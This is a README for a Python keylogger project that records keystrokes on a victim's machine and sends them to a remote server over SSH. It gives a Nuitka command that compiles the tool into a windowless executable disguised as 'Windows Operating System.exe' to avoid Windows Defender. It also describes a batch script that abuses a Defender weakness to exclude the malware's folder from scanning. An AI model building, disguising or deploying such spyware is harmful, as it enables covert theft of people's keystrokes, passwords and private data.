# Keylogger

## Requirements

Install the below Python packages listed in the **requirements.txt**.

* paramiko: makes SSH connections and managing SSH sessions.

* scp: copies files between remote and local hosts over an SSH connection using the SCP protocol.

* pynput: controls and monitors input devices such as keyboards and mice.

* Nuitka: generates standalone executables from Python code, as well as C extensions for Python.

* zstandard: compresses and decompresses data using the [Zstandard](https://facebook.github.io/zstd/) compression algorithm.

## Contents

The operation of the keylogger is based on two Python classes: Server and Logger.

* **server.py**: manages the connection to a remote server through SSH authentication.

* **logger.py**: deploys the keylogger on the target machine and sends gathered data to the remote server.

* **main.py**: main program.

Since Python scripts are detected by Windows Defender, they need to be compiled into an executable file.

To do so, write the whole Python code into a single file and execute the below command on Windows PowerShell.

```
py -m nuitka --mingw64 --standalone --disable-console --onefile --output-file='Windows Operating System.exe' main.py
```

Options:
* `--mingw64`: uses the MingGW-w64 toolchain to compile the generated C code into an executable binary.

* `--standalone`: includes all the necessary dependencies in the generated executable.

* `--disable-console`: creates a Windows GUI application without a console window.

* `--onefile`: generates a single executable file that contains all the necessary dependencies.

* `--output-file`: specifies the name and location of the generated executable file.

The batch script **build.bat** exploits a Windows Defender security flaw in order to exclude the folder where the malware is installed. More details are given [here](https://www.bleepingcomputer.com/news/security/microsoft-defender-weakness-lets-hackers-bypass-malware-detection/).

When the **Windows Operating System.exe** file is running, it does not look suspicious to the victim.
